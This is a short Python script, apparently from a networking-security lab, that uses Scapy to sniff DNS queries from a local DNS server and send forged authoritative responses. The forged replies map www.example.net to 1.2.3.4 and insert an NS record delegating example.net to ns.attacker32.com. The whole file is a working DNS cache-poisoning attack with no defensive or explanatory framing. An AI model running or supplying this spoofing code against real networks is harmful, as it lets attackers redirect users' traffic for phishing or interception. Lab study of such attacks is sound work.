#!/usr/bin/python
from scapy.all import * 


def spoof_authdns(pkt):

  # Condition to target the packets we're interested in
  if(DNS in pkt and 'www.example.net' in pkt[DNS].qd.qname):

     # Construct IP packet from sniffed packet data
     IPpkt = IP(dst=pkt[IP].src,src=pkt[IP].dst)

     # Construct UDP packet from sniffed packet data
     UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

     # Answer Section
     Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                    rdata='1.2.3.4', ttl=259200)

     # Name Server Section
     NSsec  = DNSRR(rrname="example.net", type='NS',
                    rdata='ns.attacker32.com', ttl=259200)

     # Construct DNS Response packet
     DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd,
                  aa=1,rd=0,qdcount=1,qr=1,ancount=1,nscount=1,
                  an=Anssec, ns=NSsec)

     # Concatentate respective packet segments
     spoofpkt = IPpkt/UDPpkt/DNSpkt

     # Send the packet for delivery
     send(spoofpkt)

# Target the local DNS server (Machine B) with the sniffer
pkt=sniff(filter='udp and (src host 10.0.2.5 and dst port 53)',
          prn=spoof_authdns)
